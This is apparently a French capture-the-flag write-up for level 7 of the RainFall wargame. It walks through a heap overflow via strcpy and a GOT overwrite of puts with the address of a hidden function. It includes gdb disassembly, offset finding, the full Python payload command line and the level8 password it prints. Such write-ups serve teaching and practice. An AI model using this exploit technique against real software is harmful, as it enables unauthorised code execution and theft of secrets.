#### Etape 1 : 
On trouve un executable ./level7 qui segfault lorsqu'on lui passe aucun argument mais qui imprime 2 tilde lorsqu'on lui passe 2 arguments ou plus.
```bash
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 aa
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 aa aa
~~
level7@RainFall:~$ ./level7 aa aa aaa
~~
``` 

#### Etape 2 : Décompilation / Compréhension
On decide de décompiler le binaire pour comprendre son fonctionnement.(voir source.c)


En analysant le code, on peut voir une fonction m inutilisée qui affiche le contenu de la global c qui elle grace au fgets récupère le contenu du fichier .pass du level8.
```c
__stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
``` 
En examinant le code on peut voir que le main malloc 2 structure en passant par la variable pvVar2, et copie les av[1] et av[2] dans ces structures.
```c
  pvVar2 = (void *)malloc(8);
  pvVar1 = (void *)malloc(8);
  strcpy((char *)pvVar2,av[1]);
  strcpy((char *)pvVar1,av[2]);
```

Comme vous pouvez le voir, il y a un strcpy qui copie av[1] et av[2] dans des structures de 8 octets. Nous voyons donc une ressemblance au level precedent.

#### Etape 3 : Vulnérabilité

Le strcpy n'étant pas limité par un nombre de caractéré écris, il est sujet au buffer overflow.
Nous voyons que pendant le premier appel de strcpy(), on peux reecrire l'adresse utiliser comme destination pour le deuxième strcpy().


#### Etape 4 : Objectif

Comme dans le level5 nous pouvons réecrire l'adresse de la fonction puts par celle de la fonction m.

#### Etape 4 : Informations manquantes

Il me manque l'offset pour déterminé a combien de caractère ce trouvera la nouvelle adresse a écrire
J'ai généré un buffer grâce à : https://wiremask.eu/tools/buffer-overflow-pattern-generator

Pour le strcpy 1 : 
En éxécutant le programme depuis gdb ou ltrace avec le buffer en question j'obtiens une adresse qui correspond au dernier caractère écrit avant le SegFault. Ce qui me permet de les identifier et obtenir la valeur de 20. pour le premier strcpy.

Nous retrouvons dans la Global Offset Table l'adresse de la fonction puts.
```bash
(gdb) disass main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   %ebp
   0x08048522 <+1>:	mov    %esp,%ebp
=> 0x08048524 <+3>:	and    $0xfffffff0,%esp

[...]

    0x080485e4 <+195>:	movl   $0x8049960,(%esp)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave
   0x08048602 <+225>:	ret
End of assembler dump.
(gdb) disass 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
(gdb)
```
L'adresse de puts est 0x8049928 ou en little endian \x28\x99\x04\x08.
Notre premier exploit prendra la forme suivante :
```bash
$(python -c 'print "a" * 20 + "\x28\x99\x04\x08"')
```

strcpy 2 :
Nous cherchons l'adresse de la fonction m pour  remplacer celle de puts.
avec ghidra ou gdb nous pouvons trouver l'adresse de la fonction m qui est 0x80484f4 ou en little endian \xf4\x84\x04\x08.

Notre second exploit prendra la forme suivante :
```bash
$(python -c 'print "\xf4\x84\x04\x08"')
```



#### Etape 5 : Execution

Il ne reste plus qu'a éxecuter le programme avec les 2 arguments precedents.

```bash
level7@RainFall:~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1722763803
level7@RainFall:~$
```